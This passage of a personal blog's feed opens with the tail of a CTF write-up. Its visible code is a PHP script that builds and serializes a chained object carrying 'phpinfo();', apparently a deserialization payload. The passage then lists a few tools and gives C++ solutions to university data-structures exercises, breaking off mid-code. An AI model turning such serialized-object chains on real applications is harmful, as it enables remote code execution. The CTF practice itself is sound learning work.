class="hljs-variable">$payl0ad</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;payl0ad = <span class="hljs-string">&#x27;dangerous&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class002</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$sec</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;sec = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class003</span>();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;mystr = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">class000</span>();<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>CTF赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Practicetools</title>
    <link href="/dong.github/2024/09/13/Practicetools/"/>
    <url>/dong.github/2024/09/13/Practicetools/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>记录一些工具，有时间慢慢鼓捣</strong></p><span id="more"></span><h1 id="Slidev"><a href="#Slidev" class="headerlink" title="Slidev"></a><a href="https://cn.sli.dev/guide/">Slidev</a></h1><p><strong>Slidev 的幻灯片以 Markdown 的格式编写。</strong></p><h1 id="Hyprland"><a href="#Hyprland" class="headerlink" title="Hyprland"></a><a href="https://hyprland.org/">Hyprland</a></h1><p><strong>配置炫酷的Linux桌面环境</strong></p><h1 id="Archlinux"><a href="#Archlinux" class="headerlink" title="Archlinux"></a><a href="https://archlinux.org/">Archlinux</a></h1><p><strong>能够被魔改的定制化 Linux 发行版</strong><br><a href="https://zhuanlan.zhihu.com/p/500601393">Ubuntu or Arch?</a></p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>课堂练习</title>
    <link href="/dong.github/2024/09/12/Scupractice/"/>
    <url>/dong.github/2024/09/12/Scupractice/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a><a href="https://acm.scu.edu.cn/teach/">平台</a></h1><p><strong>SCU自家题库，大二上学期数据结构与算法课题目。</strong></p><h1 id="第一周习题"><a href="#第一周习题" class="headerlink" title="第一周习题"></a>第一周习题</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>数组查找      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">100</span>;<br><span class="hljs-type">int</span> a[maxn];<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n;<span class="hljs-built_in">cin</span> &gt;&gt; n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;++ i)<br>&#123;<br><span class="hljs-built_in">cin</span> &gt;&gt; a[i] ;<br>&#125;<br><span class="hljs-type">int</span> m;<br><span class="hljs-built_in">cin</span> &gt;&gt; m;<br><span class="hljs-type">int</span> tmp = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i] == m)<br>&#123;<br>tmp = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = tmp+<span class="hljs-number">1</span>;i &lt; n;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i] &gt; m)&#123;<br>ans ++ ;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(tmp == <span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;none&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; ans;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>数组合并      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">100</span>;<br><span class="hljs-type">int</span> a[maxn];<br><span class="hljs-type">int</span> b[maxn];<br><span class="hljs-type">int</span> c[maxn];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,m;<br>cin &gt;&gt; n &gt;&gt; m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; n;++ i)<br>&#123;<br>cin &gt;&gt; a[i];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; m;++ i)<br>&#123;<br>cin &gt;&gt; b[i];<br>&#125;<br><span class="hljs-type">int</span> pa = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pb = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pc = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(pa &lt; n || pb &lt; m)<br>&#123;<br><span class="hljs-keyword">if</span>(pa &gt;= n)<br>&#123;<br>c[pc++] = b[pb++];<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(pb &gt;= m)&#123;<br>c[pc++] = a[pa++];<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(a[pa] &lt; b[pb])<br>&#123;<br>c[pc++] = a[pa++];<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>c[pc++] = b[pb++];<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; pc;++ i)<br>&#123;<br>cout &lt;&lt; c[i] &lt;&lt; <span class="hljs-string">&quot; \n&quot;</span>[i==pc];<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>二阶魔方      </div>      <div class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span>  </span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;  <br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">2</span>;  <br><span class="hljs-type">char</span> font[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>&#125;&#125;;<br><span class="hljs-type">char</span> leftt[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> rightt[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> top[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> down[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> back[maxn][maxn] = &#123;&#123;<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>&#125;&#125;;  <br><span class="hljs-type">char</span> op[<span class="hljs-number">1000</span>];<br><span class="hljs-comment">//void getprint(char (*data)[maxn]) </span><br><span class="hljs-comment">//&#123;  </span><br><span class="hljs-comment">//for(int i = 0; i &lt; maxn; ++i)</span><br><span class="hljs-comment">//&#123;  </span><br><span class="hljs-comment">//for(int j = 0; j &lt; maxn; ++j)  </span><br><span class="hljs-comment">//&#123;  </span><br><span class="hljs-comment">//cout &lt;&lt; data[i][j] &lt;&lt; &quot; \n&quot;[j==maxn];  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printans</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c\n&quot;</span>,top[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],top[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c\n&quot;</span>,top[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],top[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c %c %c %c %c %c %c\n&quot;</span>,leftt[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],leftt[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],font[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],font[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],rightt[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],rightt[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>],back[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],back[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c %c %c %c %c %c %c\n&quot;</span>,leftt[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],leftt[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],font[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],font[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],rightt[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],rightt[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>],back[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],back[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c\n&quot;</span>,down[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>],down[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    &quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %c&quot;</span>,down[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>],down[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-comment">//void swap(char *a, char *b) &#123;  </span><br><span class="hljs-comment">//char c;  </span><br><span class="hljs-comment">//c = *a;  </span><br><span class="hljs-comment">//*a = *b;  </span><br><span class="hljs-comment">//*b = c;  </span><br><span class="hljs-comment">//&#125;  </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapF</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//上、右、下、左</span><br><span class="hljs-type">char</span> tmp1 = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> tmp2 = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//下-&gt;左</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//右-&gt;下</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">//上-&gt;右</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//左-&gt;上</span><br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = tmp1;<span class="hljs-comment">//(data4[1][1])</span><br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//(data4[0][1])</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapf</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//上、右、下、左</span><br><span class="hljs-comment">//保存上</span><br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//右-&gt;上</span><br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">//下-&gt;右</span><br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//左-&gt;下</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//上-&gt;左</span><br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp1;<span class="hljs-comment">//(data1[1][0])</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//(data1[1][1])</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapU</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//U:后、左、前、右</span><br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//前-&gt;右</span><br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//左-&gt;前</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//后-&gt;左</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<span class="hljs-comment">//!!!</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<span class="hljs-comment">//!!!</span><br><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = tmp1;<span class="hljs-comment">//!!!data1[0][0]</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//!!!data1[0][1]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapR</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><span class="hljs-comment">//前、上、后、下</span><br><span class="hljs-comment">//下-&gt;前</span><br>data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>data1[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//后-&gt;下</span><br>data4[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];  <span class="hljs-comment">//!!!</span><br>data4[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]; <span class="hljs-comment">//!!!</span><br><br><span class="hljs-comment">//上-&gt;后</span><br>data3[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>data3[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-comment">//前-上</span><br>data2[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = tmp1;<span class="hljs-comment">//data1[0][1]</span><br>data2[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = tmp2;<span class="hljs-comment">//data1[1][1]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getswapr</span><span class="hljs-params">(<span class="hljs-type">char</span> (*data1)[maxn],<span class="hljs-type">char</span> (*data2)[maxn],<span class="hljs-type">char</span> (*data3)[maxn],<span class="hljs-type">char</span> (*data4)[maxn])</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-comment">//前、上、后、下</span><br><span class="hljs-comment">//保存前</span><br><span class="hljs-type">char</span> tmp1 = data1[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> tmp2 = data1[<span 